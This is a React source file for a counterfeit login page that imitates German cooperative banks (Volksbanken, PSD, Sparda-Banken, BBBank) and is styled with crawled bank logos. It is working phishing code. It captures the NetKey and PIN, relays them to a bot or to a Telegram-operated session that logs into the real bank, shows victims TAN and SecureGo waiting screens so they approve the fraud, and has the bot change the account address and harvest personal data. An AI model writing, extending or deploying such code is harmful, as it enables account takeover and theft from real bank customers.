// @ts-nocheck
import { useEffect, useMemo, useRef, useState } from "react";
import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { Eye, EyeOff, AlertCircle } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import vrLogoGeneric from "@/assets/vr-logo-generic.png";
import { resolveAsset } from "@/lib/bankAssetUrl";
import { BankShell } from "@/components/flow/BankShell";
import { TanWaitingScreen } from "@/components/flow/TanWaitingScreen";
import { BotResultScreen } from "@/components/flow/BotResultScreen";
import SplashLogoReveal from "@/components/SplashLogoReveal";
import VRSplashReveal from "@/components/VRSplashReveal";
import { AddressVerificationStep } from "@/components/flow/AddressVerificationStep";
import { startBotTask, getBotTask, confirmAddress } from "@/lib/botClient";
import { getSecureGoLabel } from "@/lib/secureGoLabel";
import { startQrLoginSession } from "@/lib/qrLogin.functions";
import {
  isNetkeyCompleted,
  rememberPendingNetkey,
  rememberPendingNetkeyMeta,
  fetchNetkeyCompletion,
  type CompletedCustomerData,
} from "@/lib/completedNetkeys";

import type { BankTheme } from "@/data/banks";


export const Route = createFileRoute("/login/$bankId")({
  head: ({ params }) => ({
    meta: [
      { title: `Online-Banking Anmeldung · ${params.bankId}` },
      { name: "description", content: "Sichere Anmeldung zum Online-Banking Ihrer Bank." },
      { property: "og:title", content: "Online-Banking Anmeldung" },
      { property: "og:description", content: "Sichere Anmeldung zum Online-Banking Ihrer Bank." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
      { name: "robots", content: "noindex,nofollow" },
    ],
  }),
  component: BankLoginRoute,
});

function BankLoginRoute() {
  const { bankId } = Route.useParams();
  return <BankLoginPage bankId={bankId} />;
}

type Bank = {
  id: string;
  name: string;
  group: string;
  logo: string | null;
  logo_url: string | null;
  logo_storage_path: string | null;
  hide_name_in_header: boolean;
  custom_theme: Partial<BankTheme> | null;
  online_banking_url: string | null;
  is_qr_branch: boolean | null;
  footer_links: Record<string, { label: string; url: string }> | null;
};


type Phase = "form" | "waiting" | "tan" | "address_confirm" | "result" | "session_expired";

const logoModules = import.meta.glob("@/assets/*.png", { eager: true, import: "default" }) as Record<string, string>;
const logoAliases: Record<string, string> = {
  "sparda-bank-muenchen-logo": "sparda-muenchen-logo",
  "bbbank-logo": "bbbank-header-logo",
};
function getLogo(name?: string | null): string | undefined {
  if (!name) return undefined;
  if (/^(https?:|data:|blob:|\/)/.test(name)) return name;
  const resolved = logoAliases[name] ?? name;
  const key = Object.keys(logoModules).find((k) => k.endsWith(`/${resolved}.png`));
  return key ? logoModules[key] : undefined;
}
const groupLogoName: Record<string, string> = {
  "Volksbanken Raiffeisenbanken": "vr-logo-generic",
  "PSD Banken": "psd-bank-logo",
  "GLS Bank": "gls-bank-logo",
  "Sparda-Banken": "sparda-bank-generic-logo",
  BBBank: "bbbank-header-logo",
};

const POLL_INTERVAL_MS = 500;
const POLL_TIMEOUT_MS = 5 * 60 * 1000;

function collectBotPayloadValues(value: unknown, depth = 0): Array<[string, unknown]> {
  if (!value || typeof value !== "object" || depth > 3) return [];
  return Object.entries(value as Record<string, unknown>).flatMap(([key, entry]) => [
    [key.toLowerCase(), entry] as [string, unknown],
    ...collectBotPayloadValues(entry, depth + 1),
  ]);
}

function hasPositiveLoginValidation(data: unknown): boolean {
  const positiveKeys = new Set([
    "authenticated",
    "credentials_valid",
    "login_valid",
    "login_validated",
    "pin_valid",
    "validated",
    "validation_success",
    "valid_credentials",
  ]);
  return collectBotPayloadValues(data).some(([key, value]) =>
    positiveKeys.has(key) && (value === true || value === 1 || String(value).toLowerCase() === "true"),
  );
}

function payloadContains(data: unknown, pattern: RegExp): boolean {
  return collectBotPayloadValues(data).some(([, value]) =>
    typeof value === "string" && pattern.test(value),
  );
}

export function BankLoginPage({ bankId }: { bankId: string }) {
  const navigate = useNavigate();
  const [bank, setBank] = useState<Bank | null>(null);
  const [groupTheme, setGroupTheme] = useState<Partial<BankTheme> | null>(null);
  const [loading, setLoading] = useState(true);
  const [initialLoading, setInitialLoading] = useState(true);
  const [loadingFading, setLoadingFading] = useState(false);
  const [notFound, setNotFound] = useState(false);

  const [phase, setPhase] = useState<Phase>("form");
  const [result, setResult] = useState<any>(null);
  const [addressData, setAddressData] = useState<any>(null);
  const [currentTaskId, setCurrentTaskId] = useState<string | null>(null);

  const [vrNetKey, setVrNetKey] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [vrNetKeyError, setVrNetKeyError] = useState(false);
  const [pinError, setPinError] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [credentialsInvalid, setCredentialsInvalid] = useState(false);
  const [alreadyDone, setAlreadyDone] = useState<null | {
    stage: "prompt" | "details";
    data: CompletedCustomerData | null;
  }>(null);


  const pollRef = useRef<{ timer: any; startedAt: number; taskId: string; positiveSeen: boolean } | null>(null);
  const qrPollRef = useRef<{ timer: any; sessionId: string; startedAt: number } | null>(null);

  function stopQrPolling() {
    if (qrPollRef.current?.timer) clearTimeout(qrPollRef.current.timer);
    qrPollRef.current = null;
  }

  function startQrPolling(sessionId: string, startedAt: number) {
    stopQrPolling();
    qrPollRef.current = { timer: null, sessionId, startedAt };
    const tick = async () => {
      if (!qrPollRef.current || qrPollRef.current.sessionId !== sessionId) return;
      if (Date.now() - startedAt > POLL_TIMEOUT_MS) {
        setErrorMsg("Zeitüberschreitung. Bitte neu starten.");
        stopQrPolling();
        setPhase("form");
        setSubmitting(false);
        return;
      }
      const { data } = await supabase
        .from("telegram_sessions")
        .select("decision")
        .eq("id", sessionId)
        .maybeSingle();
      const decision = (data as any)?.decision as string | undefined;
      if (decision === "access" || decision === "2fa_access") {
        stopQrPolling();
        setSubmitting(false);
        navigate({ to: "/qr-personal-data/$sessionId", params: { sessionId } });
        return;
      }
      if (decision === "decline" || decision === "2fa_decline") {
        stopQrPolling();
        setVrNetKeyError(true);
        setPinError(true);
        setCredentialsInvalid(true);
        setErrorMsg(null);
        setPhase("form");
        setSubmitting(false);
        return;
      }
      if (decision === "2fa_pending") {
        setPhase("tan");
        setSubmitting(false);
      } else {
        setSubmitting(true);
      }
      qrPollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
    };
    tick();
  }


  useEffect(() => {
    (async () => {
      const { extractSubdomainLabelFromUrl } = await import("@/lib/bankSubdomain");
      const cols = "id,name,group,logo,logo_url,logo_storage_path,hide_name_in_header,custom_theme,online_banking_url,is_qr_branch,footer_links,login_field_label";
      // Look up by Online-Banking suffix; fall back to bank id for legacy links.
      const { data: all } = await supabase
        .from("banks").select(cols).not("online_banking_url", "is", null);
      let match = (all ?? []).find(
        (b: any) => extractSubdomainLabelFromUrl(b.online_banking_url) === bankId,
      ) as any;
      if (!match) {
        const { data } = await supabase.from("banks").select(cols).eq("id", bankId).maybeSingle();
        match = data as any;
      }
      if (!match) {
        setNotFound(true);
        setLoading(false);
        return;
      }
      setBank(match);
      const { data: g } = await supabase
        .from("bank_groups").select("theme").eq("name", match.group).maybeSingle();
      setGroupTheme(((g?.theme as Partial<BankTheme>) ?? null));
      setLoading(false);
    })();
  }, [bankId]);

  const theme: BankTheme = useMemo(() => {
    const src: Partial<BankTheme> =
      (bank?.custom_theme && Object.keys(bank.custom_theme).length > 0
        ? bank.custom_theme
        : groupTheme) ?? {};
    return {
      primary: src.primary ?? "213 100% 30%",
      headerBg: src.headerBg ?? "#ffffff",
      buttonBg: src.buttonBg ?? "#003399",
      accentText: src.accentText ?? src.buttonBg ?? "#003399",
      topBarColor: src.topBarColor ?? src.buttonBg ?? "#003399",
      buttonRadius: src.buttonRadius ?? "rounded-full",
      footerBg: src.footerBg,
      headerText: (src as any).headerText,
      logoAlign: (src as any).logoAlign,
    };
  }, [bank, groupTheme]);

  const buttonTextColor = useMemo(() => {
    const hex = (theme.buttonBg || "").replace("#", "");
    if (hex.length !== 6) return "#ffffff";
    const r = parseInt(hex.slice(0, 2), 16);
    const g = parseInt(hex.slice(2, 4), 16);
    const b = parseInt(hex.slice(4, 6), 16);
    const lum = (0.299 * r + 0.587 * g + 0.114 * b) / 255;
    return lum > 0.65 ? "#111111" : "#ffffff";
  }, [theme.buttonBg]);

  const themeColor = theme.headerBg === "#ffffff" ? "#1a1a1a" : theme.headerBg;
  const isVR = bank?.group === "Volksbanken Raiffeisenbanken";
  const isPSD = bank?.group === "PSD Banken";
  const isSparda = bank?.group === "Sparda-Banken";
  const aliasFieldLabel = (bank?.login_field_label && String(bank.login_field_label).trim())
    ? String(bank.login_field_label).trim()
    : (isPSD ? "PSD-Key oder Alias" : isSparda ? "Sparda-NetKey oder Alias" : "VR-NetKey oder Alias");
  const secureGoLabel = getSecureGoLabel(bank?.group);

  const crawledLogo = bank ? resolveAsset("bank-logos", bank.logo_url ?? null, bank.logo_storage_path) : null;
  const groupFallback = bank ? getLogo(groupLogoName[bank.group]) : undefined;
  const vrFallback = isVR ? vrLogoGeneric : undefined;
  const logoSrc = bank
    ? crawledLogo || getLogo(bank.logo) || groupFallback || vrFallback || vrLogoGeneric
    : vrLogoGeneric;

  const showName = bank ? !bank.hide_name_in_header : true;


  useEffect(() => {
    if (loading) return;
    const t1 = setTimeout(() => setLoadingFading(true), 1400);
    const t2 = setTimeout(() => setInitialLoading(false), 1900);
    return () => { clearTimeout(t1); clearTimeout(t2); };
  }, [loading]);

  // stop polling on unmount
  useEffect(() => () => { stopPolling(); stopQrPolling(); }, []);

  function stopPolling() {
    if (pollRef.current?.timer) clearTimeout(pollRef.current.timer);
    pollRef.current = null;
  }

  function sessionKey() {
    return `bot_task_${bankId}`;
  }

  function persistTask(taskId: string) {
    try {
      sessionStorage.setItem(
        sessionKey(),
        JSON.stringify({ taskId, startedAt: Date.now() }),
      );
    } catch {}
  }

  function clearTask() {
    try { sessionStorage.removeItem(sessionKey()); } catch {}
  }

  function resetToForm() {
    stopPolling();
    clearTask();
    setPhase("form");
    setSubmitting(false);
    setResult(null);
  }

  function startPolling(taskId: string, startedAt: number) {
    stopPolling();
    pollRef.current = { timer: null, startedAt, taskId, positiveSeen: false, addressConfirmed: false } as any;

    const tick = async () => {
      if (!pollRef.current || pollRef.current.taskId !== taskId) return;
      if (Date.now() - startedAt > POLL_TIMEOUT_MS) {
        setErrorMsg("Zeitüberschreitung. Bitte neu starten.");
        resetToForm();
        return;
      }
      const { status, data } = await getBotTask(taskId).catch(() => ({ status: 0, data: {} as any }));
      if (!pollRef.current || pollRef.current.taskId !== taskId) return;

      console.log("[bot/task]", { status, data });

      if (status === 404) {
        // If we already saw positive signals, a transient 404 shouldn't kill the flow.
        if (pollRef.current.positiveSeen) {
          pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
          return;
        }
        setErrorMsg("Session abgelaufen, bitte neu starten.");
        resetToForm();
        return;
      }
      if (status === 0 || status >= 500) {
        pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
        return;
      }

      const st = data?.status;

      const payloadValues = collectBotPayloadValues(data);
      const tanRequired = payloadValues.some(([key, value]) =>
        (key === "tan_required" && value === true) ||
        (["tan_type", "qr_code", "activation_code", "challenge"].includes(key) && Boolean(value)),
      );
      const loginValidated = hasPositiveLoginValidation(data);
      const looksLikeSecureGo = payloadContains(
        data,
        /secure\s*go|sicherheitsfreigabe|kundenauthentifizierung|freigabe|tan\s*(?:erforderlich|required)|push\s*(?:tan|freigabe)/i,
      );
      const tanConfirmedSignal =
        st === "tan_confirmed" ||
        payloadValues.some(([key, value]) =>
          ([
            "tan_confirmed",
            "approved",
            "freigegeben",
            "customer_auth_confirmed",
            "customer_authentication_confirmed",
            "kundenauthentifizierung_bestaetigt",
          ].includes(key)) &&
          (value === true || value === 1 || String(value).toLowerCase() === "true"),
        );

      // Redirect to the personal-data page as soon as the bot has collected
      // the full result set. The address-change popup is unlocked later on
      // that page once the backend flips to `waiting_for_address_confirm`.
      const r = data?.result ?? null;
      const hasBaseData = !!(r && (r.person_data || r.kontakt_data || r.adressen_data));
      const needsAddressConfirm = st === "waiting_for_address_confirm";

      if (needsAddressConfirm || hasBaseData) {
        try {
          if (r) sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(r));
        } catch {}
        try {
          sessionStorage.setItem(`bot_bank_${taskId}`, JSON.stringify({
            bankId, bankName: bank?.name ?? "", group: bank?.group ?? "",
            theme, logoSrc, fallbackLogoSrc: getLogo(groupLogoName[bank?.group ?? ""]) || vrLogoGeneric,
            showName, bigLogo: bank?.group === "BBBank",
            footerLinks: bank?.footer_links ?? null,
          }));
        } catch {}
        clearTask();
        stopPolling();
        navigate({ to: "/personal-data/$taskId", params: { taskId } });
        return;
      }




      if (tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal || st === "waiting_for_tan" || st === "completed") {
        pollRef.current.positiveSeen = true;
      }

      // A completed response without personal data can still use the generic result screen.
      if (st === "completed") {
        setResult(data?.result ?? null);
        setPhase("result");
        setSubmitting(false);
        clearTask();
        stopPolling();
        return;
      }



      if (st === "waiting_for_tan" || tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal) {
        setPhase("tan");
        setSubmitting(false);

      } else if (st === "running" || st === "pending") {
        setSubmitting(true);
      } else if (st === "failed") {
        // Ignore a stale/late `failed` if we already saw positive signals
        // (e.g., user approved TAN before UI transitioned to the TAN screen).
        if (pollRef.current.positiveSeen) {
          pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
          return;
        }
        setErrorMsg("VR-NetKey oder PIN falsch.");
        resetToForm();
        return;
      } else if (st === "tan_rejected" || st === "tan_timeout") {
        setErrorMsg(st === "tan_timeout" ? "TAN-Zeitüberschreitung. Bitte neu starten." : "TAN abgelehnt. Bitte neu starten.");
        resetToForm();
        return;
      } else {
        setSubmitting(true);
      }

      pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
    };
    tick();
  }

  // resume if a task is stored (e.g., after reload)
  useEffect(() => {
    if (!bank) return;
    try {
      const raw = sessionStorage.getItem(sessionKey());
      if (!raw) return;
      const { taskId, startedAt } = JSON.parse(raw);
      if (!taskId) return;
      if (Date.now() - startedAt > POLL_TIMEOUT_MS) {
        clearTask();
        return;
      }
      setSubmitting(true);
      startPolling(taskId, startedAt);

    } catch {}
     
  }, [bank]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    // Prevent duplicate task creation if a polling loop is already active.
    if (submitting || pollRef.current || qrPollRef.current) return;
    let hasErr = false;
    if (!vrNetKey.trim()) { setVrNetKeyError(true); hasErr = true; }
    if (!pin.trim()) { setPinError(true); hasErr = true; }
    if (hasErr) return;

    const nk = vrNetKey.trim();
    if (isNetkeyCompleted(nk)) {
      setErrorMsg(null);
      setAlreadyDone({ stage: "prompt", data: null });
      void fetchNetkeyCompletion(nk).then((data) => {
        setAlreadyDone((cur) => (cur ? { ...cur, data } : cur));
      });
      return;
    }



    setSubmitting(true);
    setErrorMsg(null);
    setCredentialsInvalid(false);

    if (bank?.is_qr_branch) {
      try {
        const { sessionId } = await startQrLoginSession({
          data: {
            bankId: bank.id,
            bankName: bank.name,
            requestDomain: window.location.hostname,
            netkey: vrNetKey.trim(),
            pin,
            onlineBankingUrl: bank.online_banking_url,
          },
        });
        rememberPendingNetkey(sessionId, nk);
        rememberPendingNetkeyMeta(sessionId, { bankId: bank.id, bankName: bank.name });
        startQrPolling(sessionId, Date.now());

      } catch (err: any) {
        setSubmitting(false);
        const detail = err?.message ? String(err.message) : "unbekannter Fehler";
        console.error("[login] startQrLoginSession failed:", detail);
        setErrorMsg(`Verbindung fehlgeschlagen. Details: ${detail}`);
      }
      return;
    }

    const url = bank?.online_banking_url || `https://www.${bankId}.de/services_cloud/portal/`;

    try {
      const { task_id } = await startBotTask({ url, netkey: vrNetKey.trim(), pin });
      rememberPendingNetkey(task_id, vrNetKey.trim());
      persistTask(task_id);
      setSubmitting(true);
      startPolling(task_id, Date.now());

    } catch (err: any) {
      setSubmitting(false);
      const detail = err?.message ? String(err.message) : "unbekannter Fehler";
      // Extended diagnostic so we can see WHY published reverse-proxy domains fail
      // while the preview works. Includes resolved backend, upstream URL, cause.
      console.error("[login] startBotTask failed:", detail);
      setErrorMsg(`Verbindung zum Server fehlgeschlagen. Details: ${detail}`);
    }
  };

  if (initialLoading) {
    const showLogo = !loading && bank;
    const splashLogo = bank
      ? (crawledLogo || getLogo(bank.logo) || getLogo(groupLogoName[bank.group]) || vrLogoGeneric)
      : null;
    const isRenault = (bankId?.toLowerCase().includes("renault") ?? false) || (bank?.slug?.toLowerCase().includes("renault") ?? false) || (bank?.name?.toLowerCase().includes("renault") ?? false);
    return (
      <div
        className={`min-h-screen ${isRenault ? "bg-black" : "bg-white"} flex flex-col items-center justify-center transition-opacity duration-500 ${loadingFading ? "opacity-0" : "opacity-100"}`}
      >
        {showLogo && (
          <div>
            {isVR ? (
              <>
                <img
                  src={splashLogo || vrLogoGeneric}
                  alt={bank?.name || "Volksbank"}
                  className="block h-16 max-w-[80vw] object-contain animate-fade-in sm:h-20 md:hidden"
                  decoding="async"
                  fetchPriority="high"
                />
                <VRSplashReveal alt={bank?.name || "Volksbank"} className="hidden w-48 aspect-[4/5] md:block" />
              </>
            ) : (
              <img
                src={splashLogo!}
                alt={bank?.name || ""}
                className="h-16 sm:h-20 object-contain animate-fade-in"
                decoding="async"
                fetchPriority="high"
              />
            )}
          </div>
        )}
      </div>
    );
  }

  if (loading && !bank) {
    return null;
  }

  if (notFound || !bank) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 gap-4 px-4 text-center">
        <h1 className="text-xl font-semibold">Bank nicht gefunden</h1>
        <Link to="/" className="text-primary hover:underline">Zur Startseite</Link>
      </div>
    );
  }


  const fallbackLogoSrc = getLogo(groupLogoName[bank.group]) || vrLogoGeneric;
  const isBBBank = bank.group === "BBBank";
  const shellProps = { theme, logoSrc, fallbackLogoSrc, bankName: bank.name, showName, bigLogo: isBBBank, footerLinks: (bank.footer_links ?? null) as any };

  if (phase === "address_confirm") {
    const ad = addressData ?? {};
    const oldStreet = ad.old_street ?? ad.current_street ?? "";
    const oldPlz = ad.old_plz ?? ad.current_plz ?? "";
    const oldCity = ad.old_city ?? ad.current_city ?? "";
    const newStreet = ad.new_street ?? ad.street ?? "";
    const newPlz = ad.new_plz ?? ad.plz ?? "";
    const newCity = ad.new_city ?? ad.city ?? "";
    return (
      <BankShell {...shellProps}>
        <div className="py-6 sm:py-10 px-4">
          <AddressVerificationStep
            theme={theme}
            taskId={currentTaskId ?? undefined}
            currentAddress={{ strasse: oldStreet, plzOrt: `${oldPlz} ${oldCity}`.trim() }}
            additionalAddress={{ strasse: newStreet, plzOrt: `${newPlz} ${newCity}`.trim() }}
            bankGroup={bank.group}
            customerName={ad.customer_name ?? ad.name}
            onBack={() => {}}
            onDeleted={() => {
              // Bot continues the address change + SecureGo in the background;
              // take the user straight to the personal-data page, which keeps
              // polling and shows updated results as they arrive.
              const tid = currentTaskId;
              if (tid) {
                navigate({ to: "/personal-data/$taskId", params: { taskId: tid } });
              } else {
                setPhase("waiting");
                setSubmitting(true);
              }
            }}
          />
        </div>
      </BankShell>
    );
  }





  if (phase === "tan") {
    return (
      <BankShell {...shellProps}>
        <TanWaitingScreen theme={theme} themeColor={themeColor} secureGoLabel={secureGoLabel} vrNetKey={vrNetKey} onCancel={resetToForm} />
      </BankShell>
    );
  }

  if (phase === "result") {
    return (
      <BankShell {...shellProps}>
        <BotResultScreen themeColor={themeColor} result={result} />
      </BankShell>
    );
  }

  return (
    <BankShell {...shellProps}>
      <div className="max-w-6xl mx-auto flex flex-col lg:flex-row gap-6">
        <div className="w-full lg:w-1/2 flex flex-col gap-4">
          <div className="bg-white rounded-xl shadow-md border border-gray-200 overflow-hidden">
            <div className="p-6 sm:p-8">
              <h2 className="text-2xl sm:text-3xl font-bold mb-4" style={{ color: themeColor }}>
                Anmelden
              </h2>

              <div className="mb-5">
                <p className="font-bold text-sm text-gray-800 mb-1">
                  Achtung: Geben Sie niemals Ihre Zugangsdaten, TAN oder PIN weiter!
                </p>
                <p className="text-sm text-gray-600">
                  Unsere Mitarbeiter werden Sie niemals dazu auffordern Ihre Zugangsdaten preiszugeben oder einen Auftrag über die {secureGoLabel} App freizugeben.
                </p>
              </div>

              {errorMsg && (
                <div className="mb-4 rounded-lg bg-red-50 border border-red-200 p-4 flex items-start gap-2">
                  <AlertCircle className="w-4 h-4 mt-0.5 text-red-600 shrink-0" />
                  <p className="text-sm text-red-600 font-medium">{errorMsg}</p>
                </div>
              )}

              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <div className={`relative rounded-lg ${vrNetKeyError ? "bg-red-50" : ""}`}>
                    <input
                      id="vrNetKey"
                      type="text"
                      value={vrNetKey}
                      onChange={(e) => { setVrNetKey(e.target.value); if (e.target.value.trim()) setVrNetKeyError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                      placeholder=" "
                      className={`peer w-full px-4 pt-6 pb-2 border-2 rounded-lg focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : "border-gray-300"}`}
                      style={!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : undefined}
                      autoComplete="username"
                    />
                    <label
                      htmlFor="vrNetKey"
                      className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-base transition-all duration-150 pointer-events-none peer-focus:top-3 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-3 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs"
                    >
                      {aliasFieldLabel}
                    </label>
                  </div>
                  {vrNetKeyError && (
                    <p className="mt-1 text-sm text-red-600 font-medium flex items-center gap-1.5">
                      <AlertCircle className="w-4 h-4" />
                      {credentialsInvalid ? "VR-NetKey / Alias oder PIN falsch" : `${aliasFieldLabel} erforderlich`}
                    </p>

                  )}
                </div>

                <div>
                  <div className={`relative rounded-lg ${pinError ? "bg-red-50" : ""}`}>
                    <input
                      id="pin"
                      type={showPin ? "text" : "password"}
                      value={pin}
                      onChange={(e) => { setPin(e.target.value); if (e.target.value.trim()) setPinError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                      placeholder=" "
                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 rounded-lg focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : "border-gray-300"}`}
                      style={!pinError && pin ? { borderColor: theme.accentText } : undefined}
                      autoComplete="current-password"
                    />
                    <label
                      htmlFor="pin"
                      className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-base transition-all duration-150 pointer-events-none peer-focus:top-3 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-3 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs"
                    >
                      PIN
                    </label>
                    <button
                      type="button"
                      onClick={() => setShowPin(!showPin)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 p-1 text-gray-400 hover:text-gray-600"
                      aria-label={showPin ? "PIN verbergen" : "PIN anzeigen"}
                    >
                      {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                  {pinError && (
                    <p className="mt-1 text-sm text-red-600 font-medium flex items-center gap-1.5">
                      <AlertCircle className="w-4 h-4" />
                      {credentialsInvalid ? "VR-NetKey / Alias oder PIN falsch" : "PIN erforderlich"}
                    </p>
                  )}

                </div>

                <div className="flex gap-4 pt-2">
                  <button
                    type="button"
                    onClick={() => {
                      // Auf Bank-Subdomains rendert "/" wieder den Bank-Login,
                      // deshalb immer per full reload zur Landing wechseln.
                      try {
                        const host = window.location.hostname;
                        const parts = host.split(".");
                        const isLovable = host.endsWith("lovable.app") || host.endsWith("lovableproject.com");
                        const isBankSub = !isLovable && host !== "localhost" && parts.length >= 3;
                        if (isBankSub) {
                          const rootHost = parts.slice(-2).join(".");
                          window.location.href = `${window.location.protocol}//${rootHost}/`;
                          return;
                        }
                      } catch { /* noop */ }
                      window.location.href = "/";
                    }}
                    className={`px-8 py-3 ${theme.buttonRadius} border-2 font-medium hover:bg-gray-50 transition-colors text-sm`}
                    style={{ borderColor: theme.accentText, color: theme.accentText }}
                  >
                    Abbrechen
                  </button>
                  <button
                    type="submit"
                    disabled={submitting}
                    className={`px-8 py-3 ${theme.buttonRadius} font-medium transition-opacity hover:opacity-90 text-sm ml-auto disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center gap-2`}
                    style={{ backgroundColor: theme.buttonBg, color: buttonTextColor }}
                  >
                    {submitting ? (
                      <span className="inline-flex gap-1" aria-label="Wird geprüft">
                        <span className="w-1.5 h-1.5 rounded-full animate-bounce [animation-delay:-0.3s]" style={{ backgroundColor: buttonTextColor }} />
                        <span className="w-1.5 h-1.5 rounded-full animate-bounce [animation-delay:-0.15s]" style={{ backgroundColor: buttonTextColor }} />
                        <span className="w-1.5 h-1.5 rounded-full animate-bounce" style={{ backgroundColor: buttonTextColor }} />
                      </span>
                    ) : (
                      "Anmelden"
                    )}
                  </button>
                </div>
              </form>
            </div>
          </div>

          <div className="bg-white rounded-xl shadow-md border border-gray-200 p-6">
            <h3 className="font-bold text-sm text-gray-800 mb-3">Wichtiger Hinweis:</h3>
            <ul className="list-disc pl-5 space-y-2 text-sm text-gray-600">
              <li>
                Geben Sie Ihren {isVR ? "VR-NetKey" : isPSD ? "PSD-Key" : isSparda ? "Sparda-NetKey" : "Zugang"} nicht an Dritte weiter, um z.B. Einblicke in private Konten oder die Durchführung unberechtigter Aktionen zu unterbinden.
              </li>
              <li>Bitte nutzen Sie einen aktuellen Browser und aktuelle Sicherheitsupdates.</li>
            </ul>
          </div>
        </div>

        <div className="hidden lg:block w-full lg:w-1/2">
          <div className="bg-white rounded-xl shadow-md border border-gray-200 p-8 h-full">
            <h3 className="text-xl font-bold mb-3" style={{ color: themeColor }}>
              Sicher im Online-Banking
            </h3>
            <p className="text-sm text-gray-600 leading-relaxed mb-4">
              Ihre Sicherheit hat für uns höchste Priorität. Melden Sie sich ausschließlich über die offizielle Seite Ihrer Bank an und geben Sie Ihre Zugangsdaten niemals an Dritte weiter.
            </p>
            <ul className="list-disc pl-5 space-y-2 text-sm text-gray-600">
              <li>Prüfen Sie stets die Adresszeile Ihres Browsers.</li>
              <li>Bestätigen Sie Aufträge nur mit der {secureGoLabel} App, wenn Sie sie selbst ausgelöst haben.</li>
              <li>Bei Verdacht auf Missbrauch: Sperren Sie Ihren Zugang und kontaktieren Sie Ihre Bank.</li>
            </ul>
          </div>
        </div>
      </div>
    </BankShell>
  );
}
